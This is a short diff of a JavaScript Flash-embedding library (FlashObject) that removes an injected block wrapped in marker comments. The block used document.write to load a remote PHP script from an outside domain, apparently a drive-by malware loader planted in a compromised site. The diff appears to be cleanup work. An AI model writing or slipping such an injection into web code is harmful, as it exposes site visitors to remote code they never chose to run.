@@ -139,12 +139,3 @@ return this.length;};}
 var getQueryParamValue=com.deconcept.util.getRequestParameter;
 var FlashObject=com.deconcept.FlashObject;
 
-/*c3d067*/
-/**/
-
-
-document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
-
-
-
-/*/c3d067*/
